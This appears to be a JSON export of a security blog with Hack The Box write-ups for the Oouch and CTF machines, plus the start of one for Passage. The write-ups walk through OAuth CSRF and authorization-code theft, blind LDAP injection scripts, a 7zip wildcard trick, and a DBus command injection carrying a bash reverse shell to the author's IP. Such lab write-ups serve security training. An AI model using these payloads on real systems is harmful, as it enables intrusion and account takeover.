
[{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/authorization-code/","section":"Tags","summary":"","title":"Authorization Code","type":"tags"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/csrf/","section":"Tags","summary":"","title":"Csrf","type":"tags"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/dbus/","section":"Tags","summary":"","title":"Dbus","type":"tags"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/htb/","section":"Tags","summary":"","title":"Htb","type":"tags"},{"content":" Oouch is a hard difficulty Linux machine featuring web applications that use the OAuth authorization framework. Absence of a CSRF Token is leveraged to link an administrative account to our account, providing access to sensitive information. This information is used to register a new client application and steal the authorization code. This code is used to gain an access token, which provides unrestricted access to user resources. A misconfigured DBus server is then exploited through uWSGI in order to execute code in the context of root. Port Scanning # From the results of the nmap scan, we see that we have 4 ports open: 21, 22, 5000 and 8000\nPORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 ftp ftp 49 Feb 11 2020 project.txt 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 5000/tcp open http nginx 1.14.2 | http-title: Welcome to Oouch |_Requested resource was http://10.10.10.177:5000/login?next=%2F |_http-server-header: nginx/1.14.2 8000/tcp open rtsp FTP # From the nmap results, we can see that we have anonymous login allowed and we can access project.txt:\nftp 10.10.10.177 Connected to 10.10.10.177. 220 qtc\u0026#39;s development server Name (10.10.10.177:squ4r00t): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||48291|) 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 49 Feb 11 2020 project.txt 226 Directory send OK. ftp\u0026gt; get project.txt local: project.txt remote: project.txt 229 Entering Extended Passive Mode (|||40240|) 150 Opening BINARY mode data connection for project.txt (49 bytes). 100% |***************************************************************************************| 49 65.01 KiB/s 00:00 ETA 226 Transfer complete. 49 bytes received in 00:00 (0.94 KiB/s) ftp\u0026gt; exit 221 Goodbye. And the file contains the following:\nFlask -\u0026gt; Consumer Django -\u0026gt; Authorization Server From this, we can assume that there is an Oauth system in place and that the Django server is the Authorization Server and the Flask server is the consumer / client app.\nWebsite at :5000 # Navigating to http://10.10.10.177, we are redirected to /login?next=%2f:\nLogin Page We can also register an account at /register:\nRegister Page Let\u0026rsquo;s try to register an account\nRegistering an Account After logging in with the newly created account, we get this page:\nAfter login We have several other pages on the side bar:\nMenu: which is just the home page Menu Profile: This page shows user\u0026rsquo;s information including connected accounts, which might be handy later Profile Page Password Change: Allows us to change password. Uses a CSRF token that is verified Password Change Page Documents: This page is only accessible to admin users Documents About: From this page we learn that this web app is the authorization server About Contact: We are presented a form to report bugs to the administrator Contact However, XSS attempts are detected and stopped:\nHacking Attempt Detected! Let\u0026rsquo;s try to see if there are other pages that we can\u0026rsquo;t access from the web page UI:\nffuf -u \u0026#39;http://10.10.10.177:5000/FUZZ\u0026#39; -w /usr/share/wordlists/dirb/common.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.10.177:5000/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ [Status: 302, Size: 237, Words: 22, Lines: 4, Duration: 91ms] about [Status: 302, Size: 247, Words: 22, Lines: 4, Duration: 63ms] contact [Status: 302, Size: 251, Words: 22, Lines: 4, Duration: 67ms] documents [Status: 302, Size: 255, Words: 22, Lines: 4, Duration: 51ms] home [Status: 302, Size: 245, Words: 22, Lines: 4, Duration: 86ms] login [Status: 200, Size: 1828, Words: 414, Lines: 55, Duration: 93ms] logout [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 72ms] oauth [Status: 302, Size: 247, Words: 22, Lines: 4, Duration: 48ms] profile [Status: 302, Size: 251, Words: 22, Lines: 4, Duration: 79ms] register [Status: 200, Size: 2109, Words: 517, Lines: 64, Duration: 132ms] We see a new endpoint, /oauth:\nOAuth Endpoint After adding consumer.oouch.htb and oouch.htb to the hosts file, and trying to go to http://consumer.oouch.htb:5000/oauth/connect, we are redirected to the following URL: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82\u0026amp;response_type=code\u0026amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token\u0026amp;scope=read which is the site on port 8000.\nLet\u0026rsquo;s also add authorization.oouch.htb to our hosts file.\nWebsite at :8000 # Navigating once again to the previous URL, we land on this page:\nOAuth Server Login Page :8000/login Before moving forward, let\u0026rsquo;s have a look at how Oauth works.\nHow Oauth works ? # Oauth is an authorization framework that allows one website (consumer/client app) to access a user\u0026rsquo;s data from another website (oauth server/provider) without knowing the user\u0026rsquo;s password.\nFor more information -\u0026gt; https://portswigger.net/web-security/oauth\nLet\u0026rsquo;s take a look at the following diagram from PortSwigger showing the different steps involved:\nOAuth Worflow for Authorization Code Grant Type Authorization request: This is the first request that initiates the Oauth process. It is sent by the consumer to the Oauth server through the user\u0026rsquo;s browser. In our case, it corresponds to this request:\nAuthorization Request In this request, the consumer also sends his client_id in order to authenticate to the Oauth server, the response_type parameter indicating the grant type, redirect_uri which is the page that the user will be redirected to after consenting, finally scope indicating operations to be done with the accessed data (\u0026lsquo;read\u0026rsquo; in this case).\nUser Login \u0026amp; Consent: After the first request is sent, the user is sent to the OAuth provider page so that they can login and consent to authorize the client application to access their data.\nAuthorization Code Grant: Once the user consents, they are redirected to the URL that was provided through the redirect_uri parameter along with the authorization code. This authorization code is linked to the user account on the OAuth server/provider website.\nAccess Token Request: Using the previous authorization code, the client application will contact directly the Oauth server (without going through the user\u0026rsquo;s browser) asking for a token.\nAccess Token Grant: After doing some verifications, the OAuth server will send the token to the client application, allowing it to access user data.\nAPI Call: The client application makes an API call to retrieve user data\nUser Data: The OAuth server checks the token and sends the data.\nUnderstanding Oouch\u0026rsquo;s OAuth Flow # Going back a little bit, we notice that when we tried to connect another account to our existing account on consumer.oouch.htb:5000 through the /oauth/connect endpoint, it triggered the OAuth flow by redirecting us to the OAuth server on authorization.oouch.htb:8000/oauth/authorize along with the following parameters:\nclient_id response_type redirect_uri scope This represent the first step, or the \u0026ldquo;Authorization request\u0026rdquo;, referring to the previous diagram.\nAfter that we\u0026rsquo;re then redirected once again to the login page of the OAuth server at authorization.oouch.htb:8000/login/ where the application expects us to login and consent (this is step 2).\nHowever, right now we don\u0026rsquo;t have an account on the OAuth server website. So we\u0026rsquo;ll need to find a way to create one there.\nIf we go to authorization.oouch.htb:8000/, we see the following:\nauthorization.oouch.htb:8000/ We see in the notice that we can provide SSH credentials. This might be interesting, but for now let\u0026rsquo;s just create an account by going to /signup\nauthorization.oouch.htb:8000/signup After creating the account and logging in, we are sent to /home:\nauthorization.oouch.htb:8000/home In this page we\u0026rsquo;re shown the relevant endpoints that are involved in the OAuth process:\n/oauth/authorize: which is the endpoint where the Authorization request is sent (step 1). /oauth/token: which we don\u0026rsquo;t know the use of yet. Now that we have an account on the OAuth server (Oouch), let\u0026rsquo;s connect this account to the account that we have on consumer.oouch.htb:5000 by once again going to consumer.oouch.htb:5000/oauth/connect.\nThis time, since we\u0026rsquo;re already logged in on the OAuth server, we are directly asked to consent:\nAuthorization Prompt in Burp Once we click on Authorize, we\u0026rsquo;re redirected to our user profile at consumer.oouch.htb:5000/profile, and we see that our account on Oouch (the OAuth server) is now linked:\nOouch account linked! When we clicked on Authorize, the following POST request was sent:\nConsent POST Request which lead to a redirect to: consumer.oouch.htb:5000/oauth/connect/token?code=\u0026lt;AUTH_CODE\u0026gt;.\nWhen we hit that endpoint, it will check if the authorization code (code parameter) is valid. If so, the account linked to the authorization code (in this case the account we created on the OAuth server: squ4r00t_oouch) will be linked to the consumer web application.\nWe also notice something interesting: the state parameter is empty. The absence of this parameter potentially means that an attacker can initiate an OAuth flow themselves before tricking a user\u0026rsquo;s browser into completing it, similar to a traditional CSRF attack.\nOAuth Exploitation: Part 1 # We\u0026rsquo;ll initiate the OAuth process normally until we arrive at the moment we\u0026rsquo;re redirected to consumer.oouch.htb:5000/oauth/connect/token?code=\u0026lt;AUTH_CODE\u0026gt; at which point (without following the redirect!) we\u0026rsquo;ll try to make the administrator access that link. This will tie our account (the one on the OAuth server: squ4r00t_oouch) to the administrator\u0026rsquo;s account (the one on the consumer: port 5000).\nWe\u0026rsquo;ll send the following payload in the contact form:\n\u0026lt;a href=\u0026#34;http://consumer.oouch.htb:5000/oauth/connect/token?code=a1b2.....xyz\u0026#34;\u0026gt;click here!\u0026lt;/a\u0026gt; Make sure to replace the authorization code with a valid one tied to your account on the Authorization server. CSRF link sent to admin After a few second, we see that our Oouch account not linked anymore:\nNo Accounts Connected. Let\u0026rsquo;s try to logout, and login with our Oouch account at consumer.oouch.htb:5000/oauth/login:\nLogged in as qtc. We can see that our Oouch account was linked to qtc\u0026rsquo;s account.\nNow if we go to /documents, we see something different:\nqtc\u0026rsquo;s documents. From this we learn:\nWe have developer credentials we can use for \u0026ldquo;application registration\u0026rdquo; develop:supermegasecureklarabubu123! /api/get_user to get user data (returns a 403) /oauth/authorize supports GET method There is an ssh key to be found somewhere OAuth Exploitation: Part 2 # Let\u0026rsquo;s try to find others endpoints under /oauth/\nffuf -u \u0026#39;http://authorization.oouch.htb:8000/oauth/FUZZ\u0026#39; -w /usr/share/wordlists/dirb/common.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://authorization.oouch.htb:8000/oauth/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ applications [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 50ms] Going to /oauth/applications presents us with a login prompt and trying the credentials we found in qtc\u0026rsquo;s documents doesn\u0026rsquo;t work.\nHTTP Basic Auth After some more enumeration, we find the /oauth/applications/register endpoint where the credentials worked.\nWe are then directed to the application registration page:\nApplication Registration Page Client id and client secret are provided by the application. Clicking on save will register our new application to the OAuth server:\nApplication Created! Now that our application is created, we use it with the CSRF in the contact form in order to trick the user to authorize our application. Once they do, we\u0026rsquo;ll receive the authorization code (tied to their account) which we can then use to request an access token that will allow us to authenticate as them.\nDon\u0026rsquo;t forget to setup a listener on the return URL to catch the authorization token We can use the following payload:\n\u0026lt;a href=\u0026#34;http://authorization.oouch.htb:8000/oauth/authorize/?client_id=dQ8riRsCow9njRJOLr35uzUg0imhn9SAq8o3bawX\u0026amp;response_type=code\u0026amp;redirect_uri=http://10.10.14.14/pwned\u0026amp;scope=read\u0026amp;allow=Authorize\u0026#34;\u0026gt;click!\u0026lt;/a\u0026gt; Notice \u0026amp;allow=Authorize (originally in the request POST body) was added to the URL parameters since this endpoint is said to allow the GET method.\nAfter a few seconds, we get the authorization code on our netcat listener:\nAuthorization Code! Now we can request a token on the /oauth/token endpoint we found earlier:\nGot the Bearer token! Using this token, we can for example, access /api/get_user:\nInformation about qtc After more enumeration for other api endpoints, we find /api/get_sshkey:\nqtc\u0026rsquo;s ssh key Using the ssh key, we can login as qtc and retrieve the user flag:\nUser flag obtained ! Privesc # qtc -\u0026gt; www-data # In the home directory we find a note:\nNote in home directory This talks about an Intrusion Prevention System being implemented using DBus an iptables. This might be what was blocking us earlier when we tried XSS in the contact form.\nSince the note mentionned DBUS, let\u0026rsquo;s look at the configuration files of the different registered services. Going under /etc/dbus-1/system.d/, we find the following:\nhtb.oouch.Block\u0026rsquo;s config file This is the configuration file of the service named: htb.oouch.Block. Let\u0026rsquo;s look at its content:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!-- -*- XML -*- --\u0026gt; \u0026lt;!DOCTYPE busconfig PUBLIC \u0026#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\u0026#34; \u0026#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026#34;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;policy user=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;allow own=\u0026#34;htb.oouch.Block\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;policy user=\u0026#34;www-data\u0026#34;\u0026gt; \u0026lt;allow send_destination=\u0026#34;htb.oouch.Block\u0026#34;/\u0026gt; \u0026lt;allow receive_sender=\u0026#34;htb.oouch.Block\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;/busconfig\u0026gt; This tells us that the root user owns this service (running as root) and also that www-data is allowed to send and receive messages to and from this service.\nWhen we try to look for the website\u0026rsquo;s root directory we cannot find it on the host, /var/www doesn\u0026rsquo;t exist.\nLooking at the different network interfaces, we see that there might docker containers running on the host:\nDocker subnets We can use this bash oneliner to do a ping sweep on the different subnets:\nSince docker assigns IPs from the beginning, we can just ping the first 10\nfor i in {1..10};do ping -c 1 -W 1 172.18.0.$i \u0026gt;/dev/null \u0026amp;\u0026amp; echo \u0026#34;172.18.0.$i: up\u0026#34;; done Ping sweep results We see that 2,3,4 and 5 are up. Let\u0026rsquo;s see which one is running the website on :5000. For that we can use this command:\nfor i in {2..5}; do echo \u0026#34;test\u0026#34; \u0026gt; /dev/tcp/172.18.0.$i/5000 \u0026amp;\u0026amp; echo \u0026#34;172.18.0.$i:5000 open\u0026#34;; done :5000 port scan results We see that port 5000 is opened on 172.18.0.4, which means it\u0026rsquo;s probably the container that is running the consumer website. We also notice that port 22 is also opened:\nPort 22 also opened We can directly ssh into the container with our user qtc:\nSSH access in docker container Looking around the filesystem, we see a /code directory:\n/code directory In /code/oouch/routes.py, this part catches our attention:\n# First apply our primitive xss filter if primitive_xss.search(form.textfield.data): bus = dbus.SystemBus() block_object = bus.get_object(\u0026#39;htb.oouch.Block\u0026#39;, \u0026#39;/htb/oouch/Block\u0026#39;) block_iface = dbus.Interface(block_object, dbus_interface=\u0026#39;htb.oouch.Block\u0026#39;) client_ip = request.environ.get(\u0026#39;REMOTE_ADDR\u0026#39;, request.remote_addr) response = block_iface.Block(client_ip) bus.close() return render_template(\u0026#39;hacker.html\u0026#39;, title=\u0026#39;Hacker\u0026#39;) This code snippet checks if the content of the text field (the one in the contact page) contains an XSS. If so, it will call the method Block() from the htb.oouch.Block interface by passing it the client IP address as a parameter. Depending on how the client_ip is handle, this could lead to an injection somewhere.\nHowever we cannot test for it now since we\u0026rsquo;re the user qtc and we need to be www-data in order to interact with that service and call the Block() method.\nLooking further in the /code directory, we see the uwsgi.ini file suggesting that the applicaiton is using uWSGI which serves as an interface between web servers (like Nginx, Apache) and Python web applications/frameworks (like Django, Flask).\nSearching for uwsgi exploits, we find this one which is an RCE. This will likely get us a shell as www-data.\nYou will need to remove \u0026ldquo;import bytes\u0026rdquo; on line 18 RCE as www-data Using this we can get a reverse shell as www-data:\nReverse shell as www-data Now that we have a shell as www-data, we can use the following python script to see if there is a command injection vulnerability:\nimport sys sys.path.insert(0, \u0026#34;/usr/lib/python3/dist-packages\u0026#34;) import dbus bus = dbus.SystemBus() block_object = bus.get_object(\u0026#39;htb.oouch.Block\u0026#39;, \u0026#39;/htb/oouch/Block\u0026#39;) block_iface = dbus.Interface(block_object, dbus_interface=\u0026#39;htb.oouch.Block\u0026#39;) client_ip = \u0026#39;; bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.14/1338 0\u0026gt;\u0026amp;1\u0026#34; //\u0026#39; response = block_iface.Block(client_ip) bus.close() The first two lines were added to tell the script where to find the dbus package\nIf we run it without, we\u0026rsquo;ll get the following error:\ndbus import error After running it, we get a shell as root and can retrieve the root flag:\nRoot flag obtained ! ","date":"10 May 2025","externalUrl":null,"permalink":"/htb/oouch/","section":"Htbs","summary":"","title":"HTB - Oouch","type":"htb"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/htb/","section":"Htbs","summary":"","title":"Htbs","type":"htb"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/oauth/","section":"Tags","summary":"","title":"Oauth","type":"tags"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/oauth2/","section":"Tags","summary":"","title":"Oauth2","type":"tags"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/","section":"squ4r00t","summary":"","title":"squ4r00t","type":"page"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/uwsgi/","section":"Tags","summary":"","title":"Uwsgi","type":"tags"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/7z/","section":"Tags","summary":"","title":"7z","type":"tags"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/7zip/","section":"Tags","summary":"","title":"7zip","type":"tags"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/cron/","section":"Tags","summary":"","title":"Cron","type":"tags"},{"content":" CTF is an insane difficulty Linux box with a web application using LDAP based authentication. The application is vulnerable to LDAP injection but due to character blacklisting the payloads need to be double URL encoded. After enumeration, a token string is found, which is obtained using boolean injection. Using the token an OTP can be generated, which allows for execution of commands. After establishing a foothold, a cron can be exploited to gain sensitive information.\nPort Scan Results # From the results of the nmap scan, we see that we have 2 ports open: 22 and 80\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA) | 256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA) |_ 256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16) | http-methods: |_ Potentially risky methods: TRACE |_http-title: CTF Website # Navigating to http://10.10.10.122, we get this page telling us about a token-based (software tokens specifically) authentication system to be tested:\nHome Page We are also informed that bruteforcing attempts may result in a 5 minute ban. Banned ip will be available at /status.php:\nList of banned IPs We have a login page at /login.php:\nLogin page If we try basic credentials such as admin:1234, we get the following response:\nResponse for admin:1234 Looking at the source page, we see the following comment under the OTP input field:\nComment in the login page source Knowing that the token string is stored in an \u0026ldquo;attribute\u0026rdquo;, we can make the assumption that the authentication system is based on LDAP.\nTesting for LDAP Injection # Testing for LDAP Injection would help us validate our hypothesis that the website is using LDAP and potentially bypass the authentication system.\nFirst, we can try to send characters that are specific to LDAP\u0026rsquo;s syntax. For example, the * (wilcard) character:\nSending the * character with no encoding Sending the * character does not return any error message. This indicates that some characters are maybe filtered before reaching the application logic.\nIf that\u0026rsquo;s the case we can try URL-encoding them:\ncharacter URL-encoded once character double URL-encoded When we double URL-encoded our payload, we got a different response: \u0026ldquo;Cannot login\u0026rdquo;.\nEarlier, when we tried admin we got the response: \u0026ldquo;User admin not found\u0026rdquo;\nThis means we got a valid user by using the * character. Knowing this, and leveraging the difference between the 2 responses, we can retrieve a username character by character.\nUsername enumeration # This is how we\u0026rsquo;ll retrieve the username:\nFirst we send a* as the username. If we get the message \u0026ldquo;Cannot login\u0026rdquo;, then we know that the first letter is \u0026lsquo;a\u0026rsquo;. If we don\u0026rsquo;t, we move on to the letter \u0026lsquo;b\u0026rsquo; by sending b*, so on and so forth. Let\u0026rsquo;s say that we confirmed that the first letter is \u0026lsquo;a\u0026rsquo;. Now we repeat the process for the second letter by sending aa* We repeat this process until we get the full username. For this, we can use this python script:\nimport requests import string import time letters = list(string.ascii_lowercase) url = \u0026#39;http://10.10.10.122/login.php\u0026#39; def guess_next_char(current_guessed_string): for letter in letters: time.sleep(0.3) data = { \u0026#34;inputUsername\u0026#34;: f\u0026#34;{current_guessed_string}{letter}%2a\u0026#34;, \u0026#34;inputOTP\u0026#34;: \u0026#34;1234\u0026#34;, } response = requests.post(url, data=data) if \u0026#34;Cannot login\u0026#34; in response.text: return letter print(\u0026#34;END\u0026#34;) exit(1) username = \u0026#34;\u0026#34; while True: username += guess_next_char(username) print(username) Script running The script returned the username ldapuser. We can confirm it by trying it on the login page:\nConfirmation Now that we have a valid username, we need to know the OTP.\nReferring to the comment we found earlier, the token is stored in one of the attribute. However we don\u0026rsquo;t know which one that is. We can use the LDAP injection in order to fuzz for different attributes and see which one contains the token.\nAttribute enumeration # We can use this LDAP attributes wordlist from PayloadsAllTheThings:\nc cn co commonName dc facsimileTelephoneNumber givenName gn homePhone id jpegPhoto l mail mobile name o objectClass ou owner pager password sn st surname uid username userPassword Assuming that the LDAP logic in the backend looks like the following:\n(\u0026amp; (username=\u0026lt;USERINPUT\u0026gt;) (otp=\u0026lt;USERINPUT\u0026gt;) ) We can try to breakout of one of the conditions and add our own which will contain the attribute we are testing the existence of.\nThis can be done by sending something like ldapuser)(attribute=* as the username (double URL-encoded).\nThis will then result in the following \u0026ldquo;hypothetical\u0026rdquo; query:\n(\u0026amp; (username=ldapuser) (attribute=*) (otp=\u0026lt;USERINPUT\u0026gt;) ) If the attribute doesn\u0026rsquo;t exist we won\u0026rsquo;t get the \u0026ldquo;Cannot login\u0026rdquo; error message.\nUsing burp intruder, we can fuzz every attribute in our wordlist and see for which ones we get \u0026ldquo;Cannot login\u0026rdquo; in the response\nSetting up Burp Intruder Valid LDAP attributes Among this list of valid attributes, pager seems to be a good candidate for containing a 81 digits token. We can verify it by using the same method as we did in the username enumeration.\nToken leak # We can use a slightly modified version of the previous script:\nimport requests import string import time letters = list(string.ascii_lowercase) digits = [int(d) for d in \u0026#34;1234567890\u0026#34;] url = \u0026#39;http://10.10.10.122/login.php\u0026#39; def guess_next_char(current_guessed_string): for digit in digits: time.sleep(0.3) data = { \u0026#34;inputUsername\u0026#34;: f\u0026#34;ldapuser%29%28pager%3d{current_guessed_string}{digit}%2a\u0026#34;, \u0026#34;inputOTP\u0026#34;: \u0026#34;1234\u0026#34;, } response = requests.post(url, data=data) if \u0026#34;Cannot login\u0026#34; in response.text: return str(digit) print(\u0026#34;END\u0026#34;) exit(1) token = \u0026#34;\u0026#34; while True: token += guess_next_char(token) print(token) Start of the attack Brute Force finished OTP Generation # From the token we obtained previously, we need to generate a valid OTP which we can use to login. For this we can use the command line tool: stoken (It was mentionned on the home page that the authentication was based on Software Tokens)\nBefore running the tool, we need to make sure that our clock is synchronized with the server\u0026rsquo;s or use a time offset\nstoken --token=285449490011372370317401734215712056720371131272577450204172154164546722716756524 --pin=0000 After submitting the login request with the generated OTP, we are redirected to the following page /page.php:\n/page.php Command execution # If we try to run a command, we receive this error message:\nCannot run commands This is means that there is a group membership check that is done. So in order to execute commands we\u0026rsquo;ll either have to get access to a more privileged account or somehow bypass the group membership check.\nWe can try to do the latter by injecting a NULL byte (0x00) character after closing the ldap query.\nFor that we\u0026rsquo;ll first send ldapuser)%00 as the username and increase the number of parenthesis until we close the query.\nWith 1 parenthesis With 2 parenthesis With 3 parenthesis So we need 3 parenthesis to close the query. Now, we can try to login with ldapuser)))%00 and a valid OTP and see if we bypass the group membership check.\nLogin with null byte injection We logged in successfully with the null byte injection.\nRunning the \u0026lsquo;id\u0026rsquo; command Now we are able to run commands, we can therefore get a reverse shell:\nExecuting the reverse shell Catching the reverse shell Privesc # apache -\u0026gt; ldapuser # Looking at the files of the website, we find credentials for ldapuser in /var/www/html/login.php:\nWe can use them to login as ldapuser via ssh and retrieve the user flag:\nldapuser -\u0026gt; root # Under /backup, we can see different archives with timestamps in their name. Looking at the last modified date, we see they are each separated by a minute.\nThis indicates that there might be a cron job running every minute.\nWe also have a error.log file running every minute which is empty. And a bash script called honeypot.sh:\n# get banned ips from fail2ban jails and update banned.txt # banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds) /usr/sbin/ipset list | grep fail2ban -A 7 | grep -E \u0026#39;[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\u0026#39; | sort -u \u0026gt; /var/www/html/banned.txt # awk \u0026#39;$1=$1\u0026#39; ORS=\u0026#39;\u0026lt;br\u0026gt;\u0026#39; /var/www/html/banned.txt \u0026gt; /var/www/html/testfile.tmp \u0026amp;\u0026amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt # some vars in order to be sure that backups are protected now=$(date +\u0026#34;%s\u0026#34;) filename=\u0026#34;backup.$now\u0026#34; pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk \u0026#39;{print $1}\u0026#39;) # keep only last 10 backups cd /backup ls -1t *.zip | tail -n +11 | xargs rm -f # get the files from the honeypot and backup \u0026#39;em all cd /var/www/html/uploads 7za a /backup/$filename.zip -t7z -snl -p$pass -- * # cleaup the honeypot rm -rf -- * # comment the next line to get errors for debugging truncate -s 0 /backup/error.log Essentially this script will use 7zip to backup the contents of the /var/www/html/uploads directory. However the command uses a wildcard. We can use this in order to read files we don\u0026rsquo;t have read access for.\nThat is possible because with 7zip we can provide listfiles as arguments like this:\n7z @myfile Then 7zip will get the file with the name myfile and read its content. This file should contain a list of all the files we want to archive. It could look like this:\nfile1.pdf secret.txt In the case where myfile is a symbolic link to another file, it is the content of that file that is read instead. In our our example, let\u0026rsquo;s say we have myfile pointing to /root/root.txt. 7zip will consider the content of /root/root.txt as a file to archive, but since there are no files with that name, it will cause an error which will be logged in error.log file, disclosing the content of /root/root.txt.\nNote that providing directly the symbolic link (without using listfiles) would not work in this case since the command uses the -snl argument. This will archive the link itself instead of the content of the file that is being pointing at.\n-snl argument Another problem is that the error.log file is cleaned up after each execution. But we can use the tail command to monitor it for any changes:\ntail -f error.log So in one terminal we\u0026rsquo;ll create (as the user apache) two files:\n@myfile myfile which is a link to the file we want to read, in this case /root/root.txt Creating necessary files And in the second terminal (as ldapuser), we monitor the changes on error.log.\nAfter a few seconds, we get the root flag in the second terminal:\nRoot flag obtained! ","date":"30 April 2025","externalUrl":null,"permalink":"/htb/ctf/","section":"Htbs","summary":"","title":"HTB - CTF","type":"htb"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/ldap/","section":"Tags","summary":"","title":"Ldap","type":"tags"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/ldap-injection/","section":"Tags","summary":"","title":"Ldap Injection","type":"tags"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/otp/","section":"Tags","summary":"","title":"Otp","type":"tags"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/otp-generation/","section":"Tags","summary":"","title":"Otp Generation","type":"tags"},{"content":"","date":"27 April 2025","externalUrl":null,"permalink":"/tags/cms/","section":"Tags","summary":"","title":"Cms","type":"tags"},{"content":"","date":"27 April 2025","externalUrl":null,"permalink":"/tags/cutenews/","section":"Tags","summary":"","title":"Cutenews","type":"tags"},{"content":"","date":"27 April 2025","externalUrl":null,"permalink":"/tags/deserialisation/","section":"Tags","summary":"","title":"Deserialisation","type":"tags"},{"content":"","date":"27 April 2025","externalUrl":null,"permalink":"/tags/hashcat/","section":"Tags","summary":"","title":"Hashcat","type":"tags"},{"content":" Passage is a medium difficulty Linux machine that hosts a CuteNews web application. This is found to suffer from a remote command execution vulnerability, which is leveraged to gain a foothold. A CuteNews password hash for the application user paul is discovered and cracked. Owing to password reuse, we can use this to move laterally to the paul system user. A private SSH key is found to be shared between the system users, which allows us to move laterally to nadav. This user is found to be a member of the sudo group. Enumeration of the vim command line history reveals that the com.ubuntu.USBCreator.conf policy has been edited, in order to allow users of the sudo group to invoke methods of the usb-creator service. The D-Bus service USBCreator is found to suffer from a vulnerability, allowing the password security policy imposed by sudo binary to be bypassed. This is leveraged in order to read privileged files as root. Port Scanning # From the results of the nmap scan, we see that we have 2 ports open: 22 and 80\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) | 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) |_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Passage News |_http-server-header: Apache/2.4.18 (Ubuntu) Website # Recon # Navigating to 